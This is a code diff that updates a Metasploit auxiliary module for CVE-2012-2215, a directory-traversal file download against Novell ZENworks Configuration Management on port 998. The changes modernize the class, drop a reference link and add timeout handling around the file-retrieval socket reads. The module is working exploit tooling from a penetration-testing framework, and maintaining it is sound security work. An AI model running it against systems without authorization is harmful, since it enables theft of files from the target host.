@@ -1,12 +1,9 @@
 ##
-# This module requires Metasploit: http//metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
-class Metasploit3 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::Tcp
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::Scanner
@@ -30,8 +27,7 @@ class Metasploit3 < Msf::Auxiliary
         [
           [ 'CVE', '2012-2215' ],
           [ 'OSVDB', '80230' ],
-          [ 'URL', 'http://www.verisigninc.com/en_US/products-and-services/network-intelligence-availability/idefense/public-vulnerability-reports/articles/index.xhtml?id=975' ],
-          [ 'URL', 'http://support.novell.com/docs/Readmes/InfoDocument/patchbuilder/readme_5127930.html' ]
+          [ 'URL', 'http://www.verisigninc.com/en_US/products-and-services/network-intelligence-availability/idefense/public-vulnerability-reports/articles/index.xhtml?id=975' ]
         ]
     ))
 
@@ -40,7 +36,7 @@ class Metasploit3 < Msf::Auxiliary
         Opt::RPORT(998),
         OptString.new('FILEPATH', [true, 'The name of the file to download', '\\WINDOWS\\system32\\drivers\\etc\\hosts']),
         OptInt.new('DEPTH', [true, 'Traversal depth', 6])
-      ], self.class)
+      ])
   end
 
   def run_host(ip)
@@ -63,11 +59,23 @@ class Metasploit3 < Msf::Auxiliary
     sock.put(packet)
     sock.get_once(4, 1)
     length = sock.get_once(4, 1)
+
+    unless length
+      print_error("Unable to get length due to a timeout")
+      return
+    end
+
     sock.get_once(0x210-8, 1)
     contents = sock.get_once(length.unpack("V").first, 1)
+
+    unless contents
+      print_error("Unable to extract contents due to a timeout")
+      return
+    end
+
     disconnect
 
-    print_status "File retrieved successfully!"
+    print_good "File retrieved successfully!"
     fname = File.basename(datastore['FILEPATH'])
     path = store_loot(
       'novell.zenworks_configuration_management',
@@ -78,5 +86,4 @@ class Metasploit3 < Msf::Auxiliary
     )
     print_status("File saved in: #{path}")
   end
-
 end
